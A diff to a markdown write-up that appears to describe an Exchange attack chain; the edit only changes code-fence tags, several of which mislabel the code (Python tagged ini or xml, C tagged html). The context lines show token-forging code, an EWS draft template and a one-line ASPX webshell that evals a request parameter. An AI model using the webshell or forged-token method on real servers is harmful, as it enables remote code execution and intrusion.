@@ -81,7 +81,7 @@ So, we know we'd need a valid token, but "how" is the real question.
 
 To get an example, I set some breakpoint and intercepted some request sent by Exchange internally. And I get this token:
 
-```
+```http
 X-CommonAccessToken:VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBZGXEhlYWx0aE1haWxib3g3ZjRiOTM1VS1TLTEtNS0yMS0xOTU2NzE2NjYxLTMwNzcyMTY4MjctMzc2OTU5MzkzLTExMzVHBgAAAAcAAAAsUy0xLTUtMjEtMTk1NjcxNjY2MS0zMDc3MjE2ODI3LTM3Njk1OTM5My01MTMHAAAAB1MtMS0xLTAHAAAAB1MtMS01LTIHAAAACFMtMS01LTExBwAAAAhTLTEtNS0xNQcAAAAIUy0xLTE4LTFFAAAAAA==
 ```
 
@@ -117,7 +117,7 @@ So we basically have all the info we needed, how do we construct a token? For th
 
 Below is part of code I used to generate token:
 
-```
+```python
 def gen_token(uname, sid):
     version = 0
     ttype = 'Windows'
@@ -167,7 +167,7 @@ There is still one thing though. Since WSMan is talking directly to the target s
 
 To start, I wanted to see how the request will look like, so I setup a local listener on my machine, and send the example WinRM request. The code I used for this test is below:
 
-```
+```ini
 wsman = WSMan("127.0.0.1", username="user", password="password", ssl=False, port=8080, auth='basic', encryption='never')
 with RunspacePool(wsman) as pool:
     ps = PowerShell(pool)
@@ -192,7 +192,7 @@ Here is a simple diagram I've made.
 
 And here is the code for HTTP server:
 
-```
+```xml
 class handler(BaseHTTPRequestHandler):
 
     def do_POST(self):
@@ -222,7 +222,7 @@ I also want to note that when executing Powershell commands, be sure to do some 
 
 We need to send a XML request to Exchange Web Service(EWS) to create a email draft with the payload attachment. To save reader's time, because I've spent literally a day on this, here is the XML template. It's based on Peter's payload, but I tweaked a little bit.
 
-```
+```xml
 send_email = '''
 <soap:Envelope
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
@@ -269,7 +269,7 @@ send_email = '''
 
 Next part is to include our payload. The payload I used was the one-line ASPX webshell:
 
-```
+```html
 <script language="JScript" runat="server" Page aspcompat=true>function Page_Load(){eval(Request["cmd"],"unsafe");}</script>
 ```
 
@@ -277,7 +277,7 @@ Next part is to encode our payload, so when PST is doing encoding again, it reco
 
 From Microsoft's page I modified the code a bit, compiled it and save the binary data, and base64 encoded it.
 
-```
+```html
 #include <stdio.h>
 #include <windows.h>
 #include <string.h>
